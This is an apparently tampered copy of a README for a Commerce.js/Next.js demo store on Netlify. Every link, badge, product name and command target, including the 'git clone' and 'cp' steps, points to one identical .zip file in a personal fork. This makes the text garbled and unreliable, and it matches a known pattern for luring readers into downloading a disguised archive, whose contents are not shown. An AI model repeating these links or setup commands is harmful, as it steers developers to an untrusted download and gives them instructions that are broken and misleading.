# Demo Store with https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip and https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip 🛍️💳

[![Netlify Status](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip)](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip)
[![Stars](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip)](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip)
[![Forks](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip)](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip)

A high-fidelity fully-fledged eCommerce demo store built using the [https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip) SDK and [https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip) with live deployment to Netlify.

[![Chec see live demo button](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip)](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip)

**Note**
- This app is built using [https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip) v2 SDK

# Table of Contents

 * [Overview](#overview)
 * [Prerequisites](#prerequisites)
 * [Setup](#setup) 
     * [Create a Chec account](#create-a-chec-account)
 * [One-click Deploy with Netlify (recommended)](#one-click-deploy-with-netlify-recommended)
 * [Manual setup and Netlify deployment](#manual-setup-and-netlify-deployment)
 * [Setup using Chec CLI demo-store command](#setup-using-chec-cli-demo-store-command)
   * [Caveats with data customization (IMPORTANT)](#caveats-with-data-customization-important)
 * [🥞 Stack](#-stack)
 * [https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip features](#commercejs-features)
     * [Carts](#carts)
     * [The checkout](#the-checkout)
     * [Customers](#customers)
     * [Payment gateways](#payment-gateways)
 * [Customization and Extendability](#customization-and-extendability)


## Overview

This README will guide you in getting up and running with a fully-fledged eCommerce template. We have configured this template for you to one-click deploy directly to Netlify. Alternatively, you can manually deploy to your choice of hosting platform.

For a full detailed tutorial on building this JAMstack eCommerce application, please head on over [here](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip).


## Prerequisites

- IDE or code editor of your choice
- Node (v8.2.0 or higher)
- NPM or Yarn
- Chec CLI `yarn global add @chec/cli`

## Setup

### Create a Chec account. 

Now that you’ve installed Chec CLI globally, you will be able to access the list of `chec [COMMANDS]`, one of which is registering for a Chec account. Let’s go ahead and get that set up!

```bash
# Open the Chec registration page in your browser
chec register
```

Follow the rest of the walk-through to set up your merchant details. Alternatively, you can go [here](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip) to register for a Chec account. 


## One-click Deploy with Netlify (recommended)

The one-click deploy allows you to connect Netlify to your GitHub account to clone the `commercejs-nextjs-demo-store` repository and deploy it automatically. Be sure to go to [Netlify](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip) and sign up for an account before clicking the deploy button.

 [![Deploy to Netlify button](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip)](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip)

By clicking the above button, you will be navigated to the Netlify’s direct deploy page with the project’s repository passed as parameters in the url. Click the **Connect to GitHub** button, name your repository and enter in this [public key](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip) in the **Chec Public Key** input. Please note that for the purpose of getting you up and running with a live deploy preview of the demo store, we provided you with the Public Key from our demo merchant account. Now, save & deploy your site.

*Please note the initial build will fail if you enter in your public key instead of the provided demo merchant [key](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip). The one-click deploy is meant for presentation purposes to spin up a quick deploy. Using your merchant account would mean you would need to have the appropriate data such as multiple assets and categories associated with your products. If you would like to use your merchant account, please follow the manual setup steps below.*

## Manual setup and Netlify deployment

Manual setup involves cloning the repo into your local environment, seeding the provided sample data into your Chec account and deploying to Netlify.

**STEP 1.** Clone the repo and install dependencies

```bash
# Clone the repository locally, optionally rename the repo, change into the directory
git clone https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip chec-store 
# Change into the directory and install dependencies
cd chec-store && yarn
```

**STEP 2.** Set up your environment variables

Replace the sample `https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip` dotenv file at the root of the project to store your Chec `public_key` as well as your `secret_key`.

```bash
# Copy from source file to destination file .env
cp https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip .env
```

You can access your API key under in your Chec dashboard setup, then navigate to the Develop tab to copy your Public Key and Secret Key. Replace the provided `NEXT_PUBLIC_CHEC_PUBLIC_KEY` with your own and fill in your `CHEC_SECRET_KEY` in the `.env` file. The secret key is necessary for the seed script to have the proper permission to seed the sample data in `/seeds` into your Chec account. Remove the secret key once the data is seeded.

```dotenv
# .env

# Fill in your public key and secret key
NEXT_PUBLIC_CHEC_PUBLIC_KEY=
https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip
# Secret key is used with chec/seeder to access your Chec account to seed it with sample data
CHEC_SECRET_KEY=
NODE_ENV=
```

This file is meant to not be committed to source control and also will be hidden in file browsers.

**STEP 3.** Seed the data necessary to power your Chec store and start your development environment (necessary for initial setup).
```bash
# Seed data in /seeds into your Chec account
yarn seed
# Run your development environment on http://localhost:3000
yarn dev
```

Now head on over to http://localhost:3000 after starting your development, your site should now be populated with the sample data!

If you are replacing the sample products or categories, you can customize your own categories images under `public/images/collection. See [more info on data customization](#caveats-with-data-customization-important) below.

**STEP 5.** Make any necessary changes you need and push the code to a repository on Github or your choice of platform.

**STEP 6.** Deploy your site

Be sure to sign up for a Netlify account and log in to it. Click the **New site from Git** button and give access to select your repo. Your build settings are automatically filled out for your from the `https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip` in the template. To enter your environment variables, click **Show advanced** then **New variable** and fill in the key input as `NEXT_PUBLIC_CHEC_PUBLIC_KEY` and the value input with your Public Key. You can access your API key in your Chec dashboard under Setup, then navigate to the Developer tab to copy your Public Key

Now go ahead and click the "deploy site" to see your live site!

## Setup using Chec CLI demo-store command

This command will download this example project from GitHub and initialise it on your machine. You will be free to edit
the downloaded code and play around with [https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip) afterwards.

**STEP 1.** Install the Chec CLI

```bash
npm install -g @chec/cli
# or
yarn add -g @chec/cli
```

**STEP 2.** Create a demo store

```
chec demo-store
```

When prompted to choose a demo store from the list, choose "commercejs-nextjs-demo-store". This command will also
seed some sample data to your Chec account. For more information, see [the Chec CLI documentation](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip).

### Caveats with data customization (IMPORTANT)

Because this project is a fully fledged storefront showcasing a custom design and user flow, there are certain caveats you will run into if you customize your data in the Chec Dashboard. One gotcha is with the categories data in the UI: The categories feature images are added in the Chec API as meta data. If you add new or edit the seeded sample categories data, you can customize the categories feature image by replacing your image assets under `public/images/collection`. The file names will need to remain the same. If you plan on changing the files names or add new categories, you'll need to add new meta data. The app will expect the below inventory setup in order to build and render the components, so if you'd like to customize with your inventory in the backend make sure you:
- Create your categories in the [dashboard](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip)
- Replace categories feature images under `public/images/collection` with your own images
- If you want multiple assets to your products similar to the demo stores, you can [create assets](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip) and [assign them to your products](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip). [This guide](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip) walks through how to achieve this.

## 🥞 Stack

- Framework - [https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip)
- eCommerce - [https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip)
- Hosting - [Netlify](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip)
- Styling - [Bootstrap](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip) and [SASS](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip)

## https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip features

This demo store uses a range of features provided by https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip and powered by the Chec Dashboard.

### Carts

The shopping cart uses the https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip cart API. Carts are persisted for up to 30 days, and https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip automatically 
remembers carts for visitors.

### The checkout

https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip provides many tools to streamline checkout implementations. The checkout in this demo store makes use of:

- https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip's country and region APIs,
- the shipping methods API, and
- the discounts API (for validating and applying discounts at the checkout).

### Customers

https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip provides inbuilt functionality for supporting customer logins without any server side code. This demo store
features an existing customer login page, and provides detail about previous orders. The customer information is also
used to pre-populate the checkout with known customer details.

### Payment gateways

This demo store is configured with the Chec "test gateway" out of the box, which provides a handy payment option while
testing your storefront. Additionally, Stripe Elements support is included if Stripe is configured on the Chec
Dashboard.

[https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip <> Stripe integration documentation](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip)

#### Enabling Stripe

You must enable Stripe in the Chec Dashboard by following the instructions provided. You may add your sandbox
keys for Stripe, and use a sandbox Chec public API key to test with Stripe. Both the Chec public API key, and the Stripe
"publishable" key are configured in the `.env` file. See step two of 
"[Manual setup and Netlify deployment](#manual-setup-and-netlify-deployment)"

## Customization and Extendability

Fork this project to customize and extend the demo however you want. Here are some ideas of what you can do and
directions you can take eCommerce.

- Add shipping zones and enable shipping options in each product
- Customizing the styling
    - All global styles are done using SASS and Bootstrap
- [A/B testing checkout designs](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip) and flows
- Integrating other backend tools like Content Management Systems, Customer Support, Fulfillment services, and more
- Fetching real client reviews from review APIs
- Adding search functionality
- Leveraging [webhooks](https://github.com/suryansh-malik/commercejs-nextjs-demo-store/raw/refs/heads/master/store/actions/nextjs-store-demo-commercejs-v3.4.zip) to automate post checkout actions
